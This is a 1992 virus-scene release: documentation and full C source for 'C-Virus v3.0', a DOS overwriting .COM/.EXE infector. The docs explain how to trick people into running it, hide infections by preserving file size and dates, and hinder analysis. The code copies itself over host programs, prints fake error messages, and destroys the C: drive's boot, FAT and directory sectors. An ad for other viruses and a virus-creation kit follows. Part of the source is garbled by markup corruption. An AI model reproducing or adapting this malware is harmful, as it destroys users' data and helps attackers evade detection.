

Documentation for C-Virus v3.0
------------------------------


I. How to use

     To use C-Virus, merely rename it to some innocent (or
not-so-innocent) sounding file name, such as ULTIMA7.EXE,
GIFVIEW.COM, or HOTSEX.EXE.  Then let someone run it.  It's that
simple.  Just make sure that its extension is .EXE or .COM.
      A better choice is to infect any specific .EXE or .COM file
(or, if you really wanted to, any file) with C-Virus.  At the DOS
prompt type "CVIRUS (filename)" where filename is the name of the
victim.  C-Virus will only spread to that file, not harming any
other file in the directory. For example, you could type "CVIRUS
WC2.EXE" and, although WC2.EXE would appear unchanged (same size,
date, time, etc.), it is now actually another copy of C-Virus.
Then feel free to show "Wing Commander II"
to all your friends (on their computers, of course).  Be sure to
backup the file if you want to keep it, as CVIRUS will totally
obliterate it.  This has the nice side effect of zapping files when
C-Virus replaces a utility (ie:  C-Virus has infected LIST.COM; now
if you try to LIST KOOLWARE.EXE C-Virus infects the game you were
trying to view!).


II.  Modifying C-Virus

     C-Virus was written in Borland C++ v3.00, but will also
compile under Turbo C++ v1.00, and should port to other IBM-PC C
compilers with little modification.
     A good area for modification is the function
hostile_activity(). This function is automatically called if there
are no files left to infect.  The current version of C-Virus has
this function overwrite the victim's C:'s boot, FAT, and directory
sectors with garbage, then display a notice of C-Virus's presence
and lock up the computer.  You may want to add to this a few select
calls to abswrite(), unlink(), and biosdisk(), or write your own,
more devious routines.
     Other good expansions of C-Virus include adding support for
multiple-directory spreads (something I avoided because it would
take up too much space), changing the code so that C-Virus only
goes off on certain days, weeks, etc.  Simple modifications to
C-Virus can easily create viruses just as good as the
"professionals."
     Note:  Try to avoid using printf() or related functions; they
can increase the size of C-Virus dramatically.  Instead use the
function puts() or, better yet, use the _write() command, but this
is harder to use. In addition, note that TOO_SMALL is left defined
at 4.3k.  If, when recompiling C-Virus, you see that the final
product is larger or smaller, change TOO_SMALL to a little over the
size of the .EXE file.  This insures maximum effect without
alerting people via increase in file size.  If this number is too
small, subsequent infections will crash because all of the virus
code won't be copied into the victim.


III.  Recompiling C-Virus

     To re-compile C-Virus, use the included batch file
MAKECVIR.BAT.  This file assumes that you:  (1) Have LZEXE.EXE, and
that it's in your path; (2) DEBUG is also in your path; and (3)
That MAKECVIR.SCR is in the current directory.  If any of these
things are different on your computer, change the batch file
accordingly.  If you use a compiler other than Turbo C++ or Turbo
C, you'll have to change the name of the compiler, as well
as the options it is invoked with.  (I have it set for "fastcall"
of functions, maximum space optimizations, and duplicate string
removal [not that there are any though].)  Although C-Virus will
work in any memory model, always use the small model to avoid
excess code generation.
     A note about the "NMAN" signature:  When creating new versions
of C-Virus, I suggest changing the signature to something else.  IT
MUST BE FOUR BYTES LONG.  Change MAKECVIR.SCR so the second line
reads "DB '(four bytes)'."  Also change the definition of SIGNATURE
in the C source code to be the sum of the ASCII codes of each of the
four letters of the signature .  I would appreciate that any modified
versions do not read "NMAN" - use some other bytes.  These bytes not
only insure that there is a signature so that files aren't
re-infected, but they also stop people from UNLZEXEing your virus for
analysis (of course they could always change them back, but most
people are too stupid to think of this).


IV.  Removing C-Virus

     DO NOT accidentally infect yourself.  Infected files are
unrecoverable. If you infect your files, the only way to get rid of
the virus is to erase them.  Don't say you weren't warned.
     By the way, no virus-scanner that I know of can identify *this
version* of C-Virus.  Nothing can remove C-Virus either.  Oh well.
     A SPECIAL NOTE TO PATRICIA HOFFMAN:  This virus's name is
C-Virus, *NOT* "Nowhere Man."  That is my handle, fool!
     If you have any questions, suggestions, or complaints, you can
leave E-Mail for me at The Hell Pit BBS at (708) 459-7267.

			Happy virusing!

		    --Nowhere Man, [NuKE] '92


*****************************************************************
Look (and look out) for these fine warez by Nowhere Man:

** C-Virus           -- My first virus, the program that proves
			that C CAN be used to write good virii.
			With full C source, automated creation
			files, and docs.  THIS PRODUCT.

** Itii-Bitti (A, B) -- The world's smallest virus for it's
			abilities, Itti-Bitti has all of the bells
			and whistles of the fancier virii, but
			Strain A is only 161 bytes (two less than
			Tiny) and Strain B is only 99.  With full
			assembler source and docs.  Available now.

** DeathCow Strain B -- A lame virus based on the original
			DeathCow, a Minimal-46 variant.  Made
			smaller, it measures only fourty-two bytes.
			With full assembler source and docs.
			Available Now.

** Miniscule         -- The world's smallest functional virus,
			Miniscule is only thirty-one bytes long!
			Comes with fully-commented assembler source
			(great for learning the tricks of the
			trade).  Available now.

** Nowhere Utilities -- A group of fine utilities to assist you in
			the development and distribution of trojans
			and virii.  Also great for just having
			around when you need them.  Check it out.
			Available now.

** Code Zero	     -- A nice little appending .COM infector I
			wrote with V.C.L. to show off it's
			capabilities.  Somehow Patricia Hoffman
			got her hands on it, and the rest is
			history.  Available now.

** Kinison           -- Another .COM appender created with V.C.L.
			dedicated to the memory of Sam Kinison.
			On the anniversary of his tragic death
			in an auto accident Kinison "screams" at
			your hard disk with devistating results.
			Available now.

** V.C.L.            -- Virus Creation Laboratory, the ultimate
			virus utility.  You choose the options,
			the effects of the virus, infection rate
			and type, etc. and it does the rest!  No
			more messy assembler coding or tedious
			debugging.  Also produces trojans and
			logic bombs.  Full professional-quality
			IDE, too.  A major work to redefine the
			virus world.  Available Summer 1992.



cvirus.cpp
----------------------------------------------------------------


/* C-Virus -- A generic overwriting .COM and .EXE infector
   (C) 1992 Nowhere Man and [NuKE] WaReZ
   Written by Nowhere Man
   June 11, 1992
   Version 3.0
*/

#include <dir.h>
#include <dos.h>
#include <fcntl.h>
#include <io.h>
#include <stdio.h>


/* Note that the #define TOO_SMALL is the minimum size of the .EXE or .COM
   file which C-Virus can infect without increasing the size of the file.
   (Since this would tip off the victim to C-Virus's presence, no file under
   this size will be infected.)  It should be set to the approximate size
   of the LZEXEd .EXE file produced from this code, but always a few bytes
   larger.  Why?  Because this way C-Virus doesn't need to check itself for
   previous infection in files smaller than itself, saving time.

   SIGNATURE is the additive checksum of the four-byte signature that C-Virus
   checks for to prevent re-infection of a file.
*/

#define TOO_SMALL	4316			// C-Virus's size
#define SIGNATURE	298			// Additive checksum of "NMAN"


void hostile_activity(void)
{
	/* Put whatever you feel like doing here.  I chose to make this
	   routine trash the victim's boot, FAT, and directory sectors,
	   but you can alter this code if you want...
	*/

	static char message[] = "Sorry, but you've been hit by C-VIRUS!\r\n";

	/* Overwrite five sectors, starting with sector 0, on C:, with the
	   memory at location DS:0000 (random garbage).
	*/

	abswrite(2, 5, 0, (void *) 0);
	_write(1, message, sizeof(message));
	disable();
loop:	goto loop;		     		// Lock up the computer
}

int infected(char *fname)
{
	/* This function determines if fname is infected.  It reads four
	   bytes 28 bytes in from the start and checks them agains the
	   current header.  1 is returned if the file is already infected,
	   0 if it isn't.
	*/

	register int handle, i;
	char virus_signature[35];

	handle = _open(fname, O_RDONLY);
	_read(handle, virus_signature, sizeof(virus_signature));
	_close(handle);


	/* This next bit may look really stupid, but it actually saves about
	   100 bytes; you see, doing the additive checksum of a number
	   is almost as accurate as doing a direct string comparison, but
	   obviates the need to use strcmp().
	*/

	for (i = 28, handle = 0; i <= 31;="" i++)="" handle="" +="virus_signature[i];" return(handle="=" signature);="" }="" void="" spread(char="" *virus,="" struct="" ffblk="" *victim)="" {="" this="" function="" infects="" victim="" with="" virus.="" first,="" the="" victim's="" attributes="" are="" set="" to="" 0.="" then="" the="" virus="" is="" copied="" into="" the="" victim's="" file="" name.="" its="" attributes,="" file="" date/time,="" and="" size="" are="" set="" to="" that="" of="" the="" victim's,="" preventing="" detection,="" and="" the="" files="" are="" closed.="" */="" register="" int="" virus_handle,="" victim_handle;="" unsigned="" virus_size;="" char="" virus_code[too_small="" +="" 1],="" *victim_name;="" this="" is="" used="" enought="" to="" warrant="" saving="" it="" in="" a="" separate="" variable="" */="" victim_name="victim-">ff_name;


	/* Turn off all of the victim's attributes so it can be replaced */

	_chmod(victim_name, 1, 0);


	/* Copy virus */

	virus_handle = _open(virus, O_RDONLY);
	victim_handle = _open(victim_name, O_WRONLY);

	virus_size = _read(virus_handle, virus_code, sizeof(virus_code));
	_write(victim_handle, virus_code, virus_size);


	/* Reset victim's file date and time */

	setftime(victim_handle, (struct ftime *) &victim->ff_ftime);


	/* Close files */

	_close(virus_handle);
	_close(victim_handle);


	/* Reset victim's attributes */

	_chmod(victim_name, 1, victim->ff_attrib);
}

struct ffblk *victim(void)
{
	/* This function returns a pointer to the name of the virus's next
	   victim.  This routine is set up to try to infect .EXE and .COM
	   files.  If there is a command line argument, it will try to infect
	   that file instead.  If all files are infected, hostile activity
	   is initiated...
	*/

	register int done;
	register char **ext;
	static char *types[] = {"*.EXE", "*.COM", NULL};
	static struct ffblk ffblk;

	for (ext = (*++_argv) ? _argv : types; *ext; ext++) {
		done = findfirst(*ext, &ffblk, FA_RDONLY | FA_HIDDEN | FA_SYSTEM | FA_ARCH);
		while (!done) {
			if ((ffblk.ff_fsize > TOO_SMALL) && (!infected(ffblk.ff_name)))
				return(&ffblk);
			done = findnext(&ffblk);
		}
	}


	/* If there are no files left to infect, have a little fun */

	hostile_activity();

	return(0);				// Never reached (avoids error)
}

int main(void)
{
	/* In the main program, a victim is found and infected.  If all files
	   are infected, a malicious action is performed.  Otherwise, a bogus
	   error message is displayed, and the virus terminates with code
	   1, simulating an error.
	*/

	static char *err_msg[] = {"Program too big to fit in memory",
				  "No free file handles", "Memory allocation error",
				  "Bad memory block", "FCB creation error",
				  "Sharing violation", "Divide error",
				  "Invalid DOS version"
				 };
	static char cr_lf[] = "\r\n";
	register char *fake_error;

	fake_error = *_argv;
	spread(fake_error, victim());

	fake_error = err_msg[*(unsigned far *)MK_FP(0x0000, 0x046C) % (sizeof(err_msg) / sizeof(char *))];
	for (; *fake_error; fake_error++)
		_write(1, fake_error, 1);
	_write(1, cr_lf, sizeof(cr_lf));

	return(1);
}@echo off
bcc -O1 -d -pr -ms cvirus
if errorlevel 1 pause ** Compile error - Press Control-Break now **
erase cvirus.obj > nul
lzexe cvirus
erase cvirus.old > nul
ren cvirus.exe cvirus.tmp > nul
debug cvirus.tmp < makecvir.scr=""> nul
ren cvirus.tmp cvirus.exe > nul
echo Your virus is done...A 11C
DB "NMAN"

W
Q

</=></stdio.h></io.h></fcntl.h></dos.h></dir.h>